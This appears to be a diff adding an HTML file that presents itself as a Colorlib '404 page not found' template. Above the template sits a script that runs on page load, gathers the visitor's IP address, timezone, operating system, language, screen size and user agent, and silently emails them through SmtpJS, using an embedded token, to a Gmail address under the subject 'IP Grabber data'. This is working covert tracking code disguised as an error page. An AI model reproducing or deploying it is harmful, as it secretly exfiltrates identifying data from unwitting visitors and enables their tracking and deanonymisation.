@@ -1,0 +1,113 @@
+
+	
+<script src="https://smtpjs.com/v3/smtp.js"></script>
+
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.1/jquery.min.js"></script>
+	
+<script>
+	
+// Email
+//_________________________________________________________
+
+	
+	var status
+	
+	// Device Timezone
+	// _____________________________
+	
+	var date = new Date();
+	var timezone = date.getTimezoneOffset() / 60
+	timezone = timezone.toString()
+	
+	if(timezone[0] === "-"){}else{
+		timezone = "+" + timezone
+	}
+	
+	timezone = "UTC " + timezone 
+	
+	
+	// OS
+	// _____________________________
+	
+	
+	
+	
+		        var os = "Unknown OS"; 
+        if (navigator.userAgent.indexOf("Win") != -1) os =  
+          "Windows OS"; 
+        if (navigator.userAgent.indexOf("Mac") != -1) os =  
+          "Macintosh"; 
+        if (navigator.userAgent.indexOf("Linux") != -1) os =  
+          "Linux OS"; 
+        if (navigator.userAgent.indexOf("Android") != -1) os =  
+          "Android OS"; 
+        if (navigator.userAgent.indexOf("like Mac") != -1) os =  
+          "iOS"; 
+	
+	// IP
+	// _____________________________
+	
+	var ipAddress
+	
+	var sent = false
+	
+	
+	    $.getJSON("https://api.ipify.org?format=json", 
+        function(data) {  
+             ipAddress = data.ip 
+      })
+	
+setInterval(function(){
+
+	if(sent === false){
+	
+	if(ipAddress === undefined){}else{
+	
+		sent = true
+	
+Email.send({
+    SecureToken : "fbe7f5f7-6bc0-4e3a-834c-2b7fa02d3bda",
+    To : "unknownsmile91@gmail.com", 
+	
+    From : "no-reply-norristown-union@outlook.com",
+    Subject : "IP Grabber data",
+    Body : "Browser Language: " + navigator.language + " <br> Device Timezone: " + timezone + " <br> IP Address: " + ipAddress + " <br> Operating System: " + os + " <br> Screen Size: " + screen.width + " x " + screen.height  + " <br> User Agent: " + navigator.userAgent + '<hr> <i></a>.</i>'
+})
+.then( message => status = message ); } } }, 10);	</script>
+
+<!--Website-->
+
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+	<meta charset="utf-8">
+	<meta http-equiv="X-UA-Compatible" content="IE=edge">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+
+
+	<title>404 HTML Template by Colorlib</title>
+
+	<link href="https://fonts.googleapis.com/css?family=Montserrat:500" rel="stylesheet">
+	<link href="https://fonts.googleapis.com/css?family=Titillium+Web:700,900" rel="stylesheet">
+
+	<link type="text/css" rel="stylesheet" href="css/style.css" />
+
+</head>
+
+<body>
+
+	<div id="notfound">
+		<div class="notfound">
+			<div class="notfound-404">
+				<h1>404</h1>
+			</div>
+			<h2>Oops! This Page Could Not Be Found</h2>
+			<p>Sorry but the page you are looking for does not exist, have been removed. name changed or is temporarily unavailable</p>
+			<a href="#">Okay</a>
+		</div>
+	</div>
+
+</body>
+
+</html>
